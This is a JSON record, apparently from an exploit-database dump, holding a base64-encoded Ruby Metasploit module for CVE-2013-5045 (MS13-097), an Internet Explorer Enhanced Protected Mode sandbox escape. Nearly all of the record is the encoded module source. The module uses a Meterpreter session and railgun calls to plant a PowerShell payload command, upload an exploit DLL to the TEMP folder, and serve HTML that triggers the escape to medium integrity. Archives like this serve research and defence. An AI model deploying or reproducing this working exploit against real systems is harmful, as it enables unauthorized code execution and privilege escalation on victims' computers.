{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KcmVxdWlyZSAncmV4Jw0KcmVxdWlyZSAnbXNmL2NvcmUvZXhwbG9pdC9leGUnDQpyZXF1aXJlICdtc2YvY29yZS9leHBsb2l0L3Bvd2Vyc2hlbGwnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpMb2NhbA0KICBSYW5rID0gR3JlYXRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlBvd2Vyc2hlbGwNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwU2VydmVyDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpQcml2DQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCiAgICBzdXBlciggdXBkYXRlX2luZm8oIGluZm8sDQogICAgICAnTmFtZScgICAgICAgICAgID0+ICdNUzEzLTA5NyBSZWdpc3RyeSBTeW1saW5rIElFIFNhbmRib3ggRXNjYXBlJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgID0+ICVxew0KICAgICAgICBUaGlzIG1vZHVsZSBleHBsb2l0cyBhIHZ1bG5lcmFiaWxpdHkgaW4gSW50ZXJuZXQgRXhwbG9yZXIgU2FuZGJveCB3aGljaCBhbGxvd3MgdG8NCiAgICAgICAgZXNjYXBlIHRoZSBFbmhhbmNlZCBQcm90ZWN0ZWQgTW9kZSBhbmQgZXhlY3V0ZSBjb2RlIHdpdGggTWVkaXVtIEludGVncml0eS4gVGhlDQogICAgICAgIHZ1bG5lcmFiaWxpdHkgZXhpc3RzIGluIHRoZSBJRVNldFByb3RlY3RlZE1vZGVSZWdLZXlPbmx5IGZ1bmN0aW9uIGZyb20gdGhlIGllZnJhbWUuZGxsDQogICAgICAgIGNvbXBvbmVudCwgd2hpY2ggY2FuIGJlIGFidXNlZCB0byBmb3JjZSBtZWRpdW0gaW50ZWdyaXR5IElFIHRvIHVzZXIgaW5mbHVlbmNlZCBrZXlzLg0KICAgICAgICBCeSB1c2luZyByZWdpc3RyeSBzeW1saW5rcyBpdCdzIHBvc3NpYmxlIGZvcmNlIElFIHRvIGFkZCBhIHBvbGljeSBlbnRyeSBpbiB0aGUgcmVnaXN0cnkNCiAgICAgICAgYW5kIGZpbmFsbHkgYnlwYXNzIEVuaGFuY2VkIFByb3RlY3RlZCBNb2RlLg0KICAgICAgfSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ0phbWVzIEZvcnNoYXcnLCAjIFZ1bG5lcmFiaWxpdHkgRGlzY292ZXJ5IGFuZCBvcmlnaW5hbCBleHBsb2l0IGNvZGUNCiAgICAgICAgICAnanVhbiB2YXpxdWV6JyAjIG1ldGFzcGxvaXQgbW9kdWxlDQogICAgICAgIF0sDQogICAgICAnUGxhdGZvcm0nICAgICAgID0+IFsgJ3dpbicgXSwNCiAgICAgICdTZXNzaW9uVHlwZXMnICAgPT4gWyAnbWV0ZXJwcmV0ZXInIF0sDQogICAgICAnU3RhbmNlJyAgICAgICAgID0+IE1zZjo6RXhwbG9pdDo6U3RhbmNlOjpBZ2dyZXNzaXZlLA0KICAgICAgJ1RhcmdldHMnICAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0lFIDggLSAxMScsIHsgfSBdDQogICAgICAgIF0sDQogICAgICAnRGVmYXVsdFRhcmdldCcgID0+IDAsDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICJEZWMgMTAgMjAxMyIsDQogICAgICAnUmVmZXJlbmNlcycgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbJ0NWRScsICcyMDEzLTUwNDUnXSwNCiAgICAgICAgICBbJ01TQicsICdNUzEzLTA5NyddLA0KICAgICAgICAgIFsnQklEJywgJzY0MTE1J10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9naXRodWIuY29tL3R5cmFuaWQvSUUxMVNhbmRib3hFc2NhcGVzJ10NCiAgICAgICAgXQ0KICAgICkpDQoNCiAgICByZWdpc3Rlcl9vcHRpb25zKA0KICAgICAgWw0KICAgICAgICBPcHRJbnQubmV3KCdERUxBWScsIFt0cnVlLCAnVGltZSB0aGF0IHRoZSBIVFRQIFNlcnZlciB3aWxsIHdhaXQgZm9yIHRoZSBwYXlsb2FkIHJlcXVlc3QnLCAxMF0pDQogICAgICBdKQ0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgIHByaW50X3N0YXR1cygiUnVubmluZyBtb2R1bGUgYWdhaW5zdCAje3N5c2luZm9bJ0NvbXB1dGVyJ119IikgdW5sZXNzIHN5c2luZm8ubmlsPw0KDQogICAgbW9kX2hhbmRsZSA9IHNlc3Npb24ucmFpbGd1bi5rZXJuZWwzMi5HZXRNb2R1bGVIYW5kbGVBKCdpZXhwbG9yZS5leGUnKQ0KICAgIGlmIG1vZF9oYW5kbGVbJ3JldHVybiddID09IDANCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAiTm90IHJ1bm5pbmcgaW5zaWRlIGFuIEludGVybmV0IEV4cGxvcmVyIHByb2Nlc3MiKQ0KICAgIGVuZA0KDQogICAgdW5sZXNzIGdldF9pbnRlZ3JpdHlfbGV2ZWwgPT0gSU5URUdSSVRZX0xFVkVMX1NJRFs6bG93XQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vdFZ1bG5lcmFibGUsICJOb3QgcnVubmluZyBhdCBMb3cgSW50ZWdyaXR5IikNCiAgICBlbmQNCg0KICAgIGJlZ2luDQogICAgICBUaW1lb3V0LnRpbWVvdXQoZGF0YXN0b3JlWydERUxBWSddKSB7IHN1cGVyIH0NCiAgICByZXNjdWUgVGltZW91dDo6RXJyb3INCiAgICBlbmQNCg0KICAgIHNlc3Npb24ucmFpbGd1bi5rZXJuZWwzMi5TZXRFbnZpcm9ubWVudFZhcmlhYmxlQSgiUFNIX0NNRCIsIG5pbCkNCiAgICBzZXNzaW9uLnJhaWxndW4ua2VybmVsMzIuU2V0RW52aXJvbm1lbnRWYXJpYWJsZUEoIkhUTUxfVVJMIiwgbmlsKQ0KICBlbmQNCg0KICBkZWYgcHJpbWVyDQogICAgY21kID0gY21kX3BzaF9wYXlsb2FkKHBheWxvYWQuZW5jb2RlZCkuZ3N1YignJUNPTVNQRUMlIC9CIC9DIHN0YXJ0IHBvd2Vyc2hlbGwuZXhlICcsJycpLnN0cmlwDQogICAgc2Vzc2lvbi5yYWlsZ3VuLmtlcm5lbDMyLlNldEVudmlyb25tZW50VmFyaWFibGVBKCJQU0hfQ01EIiwgY21kKQ0KDQogICAgaHRtbF91cmkgPSAiI3tnZXRfdXJpfS8je3JhbmRfdGV4dF9hbHBoYSg0ICsgcmFuZCg0KSl9Lmh0bWwiDQogICAgc2Vzc2lvbi5yYWlsZ3VuLmtlcm5lbDMyLlNldEVudmlyb25tZW50VmFyaWFibGVBKCJIVE1MX1VSTCIsIGh0bWxfdXJpKQ0KDQogICAgdGVtcCA9IGdldF9lbnYoJ1RFTVAnKQ0KDQogICAgcHJpbnRfc3RhdHVzKCJMb2FkaW5nIEV4cGxvaXQgTGlicmFyeS4uLiIpDQoNCiAgICBzZXNzaW9uLmNvcmUubG9hZF9saWJyYXJ5KA0KICAgICAgJ0xpYnJhcnlGaWxlUGF0aCcgPT4gOjpGaWxlLmpvaW4oTXNmOjpDb25maWcuZGF0YV9kaXJlY3RvcnksICJleHBsb2l0cyIsICJDVkUtMjAxMy01MDQ1IiwgIkNWRS0yMDEzLTUwNDUuZGxsIiksDQogICAgICAnVGFyZ2V0RmlsZVBhdGgnICA9PiB0ZW1wICsgICJcXENWRS0yMDEzLTUwNDUuZGxsIiwNCiAgICAgICdVcGxvYWRMaWJyYXJ5JyAgID0+IHRydWUsDQogICAgICAnRXh0ZW5zaW9uJyAgICAgICA9PiBmYWxzZSwNCiAgICAgICdTYXZlVG9EaXNrJyAgICAgID0+IGZhbHNlDQogICAgKQ0KICBlbmQNCg0KICBkZWYgb25fcmVxdWVzdF91cmkoY2xpLCByZXF1ZXN0KQ0KICAgIGlmIHJlcXVlc3QudXJpID1+IC9cLmh0bWwkLw0KICAgICAgcHJpbnRfc3RhdHVzKCJTZW5kaW5nIHdpbmRvdyBjbG9zZSBodG1sLi4uIikNCiAgICAgIGNsb3NlX2h0bWwgPSA8PC1lb3MNCjxodG1sPg0KPGJvZHk+DQo8c2NyaXB0Pg0Kd2luZG93Lm9wZW4oJycsICdfc2VsZicsICcnKTsNCndpbmRvdy5jbG9zZSgpOw0KPC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+DQogICAgICBlb3MNCiAgICAgIHNlbmRfcmVzcG9uc2UoY2xpLCBjbG9zZV9odG1sLCB7ICdDb250ZW50LVR5cGUnID0+ICd0ZXh0L2h0bWwnIH0pDQogICAgZWxzZQ0KICAgICAgc2VuZF9ub3RfZm91bmQoY2xpKQ0KICAgIGVuZA0KICBlbmQNCg0KZW5k", 
    "filename": "platforms/windows/local/33893.rb", 
    "id": "33893", 
    "cves": [
        "CVE-2013-5045"
    ]
}